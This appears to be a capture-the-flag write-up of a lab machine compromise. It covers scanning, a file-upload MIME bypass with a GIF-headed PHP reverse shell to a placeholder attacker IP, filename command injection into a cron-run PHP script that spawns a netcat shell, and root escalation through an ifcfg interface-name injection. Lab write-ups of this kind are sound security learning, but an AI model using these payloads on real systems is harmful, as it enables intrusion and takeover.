----
#mimebypass #ifcfg

#### Reconnaissance

`nmap -sC -sV -p- 10.10.10.146`

```
Nmap scan report for 10.10.10.146
Host is up (0.078s latency).
Not shown: 65390 filtered tcp ports (no-response), 142 filtered tcp ports (host-unreach)
PORT    STATE  SERVICE VERSION
22/tcp  open   ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 2275d7a74f81a7af5266e52744b1015b (RSA)
|   256 2d6328fca299c7d435b9459a4b38f9c8 (ECDSA)
|_  256 73cda05b84107da71c7c611df554cfc4 (ED25519)
80/tcp  open   http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
443/tcp closed https

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 152.26 seconds
```

#### Enumeration

##### Port 80 - HTTP

- Port 80 is hosting a static webpage with the following text:

![[Screenshot 2023-06-12 at 9.27.08 PM.png|400]]

- Enumerating possible files/directories against the parent directory gives the following:

`ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt -u http://10.10.10.146/FUZZ  `

![[Screenshot 2023-06-12 at 11.33.59 PM.png|600]]

- Navigating to these directories gives us a page with file upload capabilities and a tar archive names `backup.tar`

![[Screenshot 2023-06-12 at 11.39.19 PM.png|400]]

![[Screenshot 2023-06-12 at 11.38.52 PM.png|400]]

- Extracting the archive provides `php` files that are hosted on the web server:

![[Screenshot 2023-06-12 at 11.40.36 PM.png|400]]

#### Exploitation

- Looking within the source code files, there are three file upload validation methods being used:

	1. `check_file_type()`  &  `file_mime_type()`: checks mime type of the uploaded file, must return a value of a image format
	2. `filesize()`: uploaded file must be less than 60,000 bytes
	3. File extension must end with `.jpg, .png, .gif, .jpeg`

- To bypass the mime type validation, adding `GIF89a;` to the first line of a shell code. Bypassing the other methods can be achieved through changing the file extension and ensuring the file does not exceed 60,000 bytes.
```
GIF89a;
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/<ATTACKER IP>/<PORT> 0>&1'");
?>
```

- Uploading the file gives us the following response:

![[Screenshot 2023-07-12 at 10.07.52 AM.png|600]]

- Opening a netcat listener to the specified port and navigating to the photo gallery gives us a shell as the `apache` user:

![[Screenshot 2023-07-12 at 10.54.14 AM.png|400]]

#### Privilege Escalation to `guly`

- Two interesting files that the user, `apache`, has read access to in `guly` home directory are `check_attack.php` and `crontab.guly`. 

-  The `check_attack.php` script scans each file within the `uploads` directory for a valid IPv4 address for a filename. If the filename is not valid, the script removes and mails the `guly` user information about the file. 

```
<?php
require '/var/www/html/lib.php';
$path = '/var/www/html/uploads/';
$logpath = '/tmp/attack.log';
$to = 'guly';
$msg= '';
$headers = "X-Mailer: check_attack.php\r\n";

$files = array();
$files = preg_grep('/^([^.])/', scandir($path));

foreach ($files as $key => $value) {
        $msg='';
  if ($value == 'index.html') {
        continue;
  }
  #echo "-------------\n";

  #print "check: $value\n";
  list ($name,$ext) = getnameCheck($value);
  $check = check_ip($name,$value);

  if (!($check[0])) {
    echo "attack!\n";
    # todo: attach file
    file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX);

    exec("rm -f $logpath");
    exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
    echo "rm -f $path$value\n";
    mail($to, $msg, $msg, $headers, "-F$value");
  }
}

?>
```

- This script is ran every 3 minutes using crontab, as specified in the `crontab.guly` file.
	`*/3 * * * * php /home/guly/check_attack.php`

- The method a file is removed using the `exec` function includes the `$value` variable, which is the filename(s) included in the `uploads` directory. This can be used to inject and run a command by including a semicolon in the front of the filename to obtain a shell as `guly`:
	`touch ;nc <ATTACKER IP> <PORT> -c bash`

![[Screenshot 2023-07-12 at 2.50.21 PM.png|500]]

#### Privilege Escalation to `root`

- The `guly` user can run sudo with the following commands:

![[Screenshot 2023-07-12 at 2.56.40 PM.png|500]]

- The `changename.sh` script outputs a script from `network-scripts` that has a privilege escalation vulnerability
	- [Vulmon Exploit](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

- Following the documented vulnerability, we are able to escalate our privileges by adding a space and a command to be executed after the value for the `interface NAME` field of the script.

![[Screenshot 2023-07-12 at 3.27.38 PM.png|400]]
